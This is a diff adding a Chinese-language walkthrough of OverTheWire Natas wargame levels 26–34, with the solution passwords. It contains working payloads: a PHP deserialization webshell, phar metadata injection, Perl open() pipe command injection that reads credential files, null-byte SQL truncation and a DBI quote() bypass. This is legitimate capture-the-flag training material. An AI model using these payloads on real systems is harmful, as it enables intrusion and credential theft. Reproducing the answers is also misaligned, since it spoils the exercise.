@@ -1,4 +1,4 @@
-# Natas
+# Natas 2024.06.22
 
 /etc/natas_webpass/natasX
 
@@ -630,48 +630,236 @@ URL: http://natas26.natas.labs.overthewire.org
 
 ## Level 26
 
+利用写入 cookie，来触发 Logger 的 php 反序列化在 web 目录中写入 webshell，读取文件
+
+```php
+
+编辑 shell.php 文件内容如下(需要将php shell 写入到exitMsg，写入initMsg中时不能写入到php文件中)：
+
+<?php
+class Logger {
+    private $logFile = '/var/www/natas/natas26/img/apl.php';
+    private $initMsg = 'X\n';
+    private $exitMsg = 'A<?php system("cat /etc/natas_webpass/natas27");?>\n';
+}
+$obj = new Logger();
+print base64_encode(serialize($obj));
+?>
+
+php shell.php
+
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvYXBsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjM6IlhcbiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUyOiJBPD9waHAgc3lzdGVtKCJjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTs/PlxuIjt9
 ```
 
+将上面得到的 base64 值，替换到 cookie 中，然后访问，触发写入文件，下面的显示说明序列化已经触发：
+
 ```
+Fatal error: Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105 Stack trace: #0 /var/www/natas/natas26/index.php(131): storeData() #1 {main} thrown in /var/www/natas/natas26/index.php on line 105
+```
+
+最后访问 http://natas26.natas.labs.overthewire.org/img/apl.php 得到密码: u3RRffXjysjgwFU6b9xa23i6prmUsYne
+
+Username: natas27 Password: u3RRffXjysjgwFU6b9xa23i6prmUsYne
+
+URL: http://natas27.natas.labs.overthewire.org
 
 ## Level 27
 
-```
+sql 绕过:
 
 ```
+username 在数据库中是64位长度。
+
+$user=mysqli_real_escape_string($link, substr($usr, 0, 64));  这里只去了前64个字符进行了关键字转义
+
+name: natas28%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00x
+pass: 123
+
+Welcome natas28!
+Here is your data:
+Array ( [username] => natas28 [password] => 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj )
+```
+
+Username: natas28 Password: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+
+URL: http://natas28.natas.labs.overthewire.org
 
 ## Level 28
 
 ```
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPLP9baIk2Ue8NLFHkisvCsovfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
 
+后面的query参数像是加密的信息。
+
+访问 http://natas28.natas.labs.overthewire.org/search.php/?query=
+
+Notice: Uninitialized string offset: -1 in /var/www/natas/natas28/search.php on line 59
+Zero padding found instead of PKCS#7 padding
+
+证明了使用PKCS#7
 ```
+
+https://ithelp.ithome.com.tw/articles/10339704 参照的这个方案进行的解决
+
+Username: natas29 Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+
+URL: http://natas29.natas.labs.overthewire.org
 
 ## Level 29
 
 ```
+http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+2 可能存在文件包含，或者是文件读取时带入其他命令执行RCE
 
+尝试进行探测：
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls+%00
+显示了当前文件夹中的文件列表, %00 用于截断后面的 .txt
+index.pl
+perl underground 2.txt
+perl underground 3.txt
+perl underground 4.txt
+perl underground 5.txt
+perl underground.txt
+
+看看index.pl 中什么内容
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+index.pl+%00
+
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!<br>";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "<pre>";
+        while (<FD>){
+            print CGI::escapeHTML($_);
+        }
+        print "</pre>";
+    }
+}
+
+需要使用"拼接绕过 ~/natas/
+
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+/etc/na%22%22tas_webpass/na%22%22tas30+%00
+
+WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
 ```
+
+Username: natas30 Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+
+URL: http://natas30.natas.labs.overthewire.org
 
 ## Level 30
 
-```
+先查看源码，看实现逻辑。
 
 ```
+my $query="Select * FROM users where username =". $dbh->quote(param('username')) ." and password =".$dbh->quote(param('password'));
+
+quote 可以用传入多个同名的参数进行双引号包裹绕过, 第二个参数决定如何引用，如果第二个参数为数字，则返回一个没用双引号包裹的值。
+
+username=natas31&password='xx'+or+1=1--+-&password=4
+
+m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+```
+
+Username: natas31 Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+
+URL: http://natas31.natas.labs.overthewire.org
 
 ## Level 31
 
 ```
+while (<$file>)  这里可能存在RCE，当file为ARGV时，运算符<>将遍历所有的的参数值，将每个值插入到open()的调用中，这样我们就能在POST请求中打开并打印服务器上包含的任何文件内容。在调用open()函数是，它只是将文件描述符打开到指定的文件路径，除非‘|’字符被附加到字符串末尾，在这种情况下open（）不仅会打开文件，还会执行文件。
 
+使用bp抓包进行修改:
+/index.pl?cat%20/etc/natas_webpass/natas32%20|
+
+------WebKitFormBoundaryJylzpAFAV8LpinZU
+Content-Disposition: form-data; name="file"
+Content-Type: text/csv
+ARGV
+------WebKitFormBoundaryJylzpAFAV8LpinZU
+Content-Disposition: form-data; name="file"; filename="text.csv"
+Content-Type: text/csv
+ARGV
+------WebKitFormBoundaryJylzpAFAV8LpinZU
+Content-Disposition: form-data; name="submit"
+Upload
+------WebKitFormBoundaryJylzpAFAV8LpinZU--
 ```
+
+Username: natas32 Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+
+URL: http://natas32.natas.labs.overthewire.org
 
 ## Level 32
 
 ```
+POST /index.pl?./getpassword%20| HTTP/1.1
+------WebKitFormBoundary57MeBt5i4AQz239x
+Content-Disposition: form-data; name="file"
+Content-Type: text/csv
+ARGV
+------WebKitFormBoundary57MeBt5i4AQz239x
+Content-Disposition: form-data; name="file"; filename="text.csv"
+Content-Type: text/csv
+ARGV
+------WebKitFormBoundary57MeBt5i4AQz239x
+Content-Disposition: form-data; name="submit"
+Upload
+------WebKitFormBoundary57MeBt5i4AQz239x--
 
+2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
 ```
+
+Username: natas33 Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+
+URL: http://natas33.natas.labs.overthewire.org
 
 ## Level 33
 
 ```
+ if(md5_file($this->filename) == $this->signature){
+    echo "Congratulations! Running firmware update: $this->filename <br>";
+    passthru("php " . $this->filename);
+}
 
+这里能够根据文件名执行命令，需要使用 phar
+
+在kali上创建p.php内容如下:
+<?php system("cat /etc/natas_webpass/natas34");?>
+
+先上传，抓包修改文件名为 p.php 否则就是一个随机的无法后续利用的随机数名字 <input type="hidden" name="filename" value="otckda1q5h4smob75dpsne66m7" />
+
+创建phar.php内容如下:
+<?php
+class Executor{
+    private $filename = 'p.php';
+    private $signature = True;
+    private $init=False;
+}
+$obj = new Executor();
+
+$phar = new Phar('t.phar');
+$phar->startBuffering();
+$phar->setStub('<?php __HALT_COMPILER();?>');
+$phar->setMetadata($obj);                     <-- 这里是攻击点，注入自定义的序列化信息，在执行时就会进行反序列化操作，执行用户特定的rce
+$phar->addFromString('test.txt', 'text');
+$phar->stopBuffering();
+?>
+
+php -i | grep phar 必须为Off才行
+
+然后执行 php -d phar.readonly=Off phar.php
+
+生成了t.phar ，然后用此文件继续上传，并且修改文件名 phar://t.phar ， 必须有phar:// 前缀为协议，才能触发 md5_file($this->filename) 解析执行
+
+j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
 ```
+
+Username: natas34 Password: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
+
+URL: http://natas34.natas.labs.overthewire.org
+
+Congratulations! You have reached the end... for now.
